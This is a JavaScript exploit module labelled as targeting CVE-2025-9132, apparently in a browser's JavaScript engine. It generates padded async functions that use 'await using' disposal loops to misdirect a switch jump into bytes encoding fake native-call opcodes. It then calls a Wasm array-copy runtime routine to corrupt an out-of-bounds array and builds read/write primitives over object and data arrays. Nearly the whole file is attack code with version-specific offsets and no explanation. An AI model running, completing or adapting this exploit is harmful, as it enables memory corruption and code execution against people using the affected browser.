let explOffsets = {
    switchTargetOffsetCount: 46271, // b5 return
    wasmArrayCopyIndex: 0x5302,
}


function GenerateNativeFunction(index, argc, offsets) {
let opcode = `0x` + ((0x0300006d | ((index & 0xff) << 16) | (index & 0xff00)) + (argc << 24)).toString(16).padStart(8, '0');
console.log(opcode);

const AsyncFunction = async function () { }.constructor;
let nativeFunc = new AsyncFunction('swindex', 'a1', 'a2', 'a3', 'a4', 'a5', `
let y = 0x0101;
let z = 0;

switch (swindex) {
  case 0:
      for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}
      for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}
      for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}
      for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}

      break;
  case 10:
  case 11:
  case 12:
  case 13:
  case 14:
  default:
    throw 1
}

y += 0x0101; 
y += 0x0101;

${new Array(offsets.switchTargetOffsetCount).fill('y += 0x01010101;').join('')}
${argc == 1 ? 'for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}; for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}' : ''};
y += ${opcode}; 
${argc == 2 ? 'for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}; for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}' : ''};
y += ${opcode};
${argc == 3 ? 'for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}; for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}' : ''};
y += ${opcode};
${argc == 4 ? 'for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}; for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}' : ''};
y += ${opcode};
${argc == 5 ? 'for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}; for (await using _ = {[Symbol.asyncDispose]() {}}; ; ){}' : ''};
y += ${opcode};
y += ${opcode};
y += ${opcode};
y += ${opcode};
return;
`);

return (...args) => {
    return nativeFunc(5, ...args.reverse());
}
}


async function primitiveFactory(offsets) {
let WasmArrayCopy = GenerateNativeFunction(offsets.wasmArrayCopyIndex, 5, offsets);
WasmArrayCopy(oobarr, 0, 0x4141414142424242434343434444444445454545464646460100000048484848n, 0, 1);
console.log(oobarr.length);


let accessor = new OobarrAccessor(oobarr, objarr, crwarr);
accessor.factory();
return accessor;
}

export async function execute(version) {
await console.log('Executing CVE-2025-9132');
let offsets = init(explOffsets, version);
return await primitiveFactory(offsets);
}
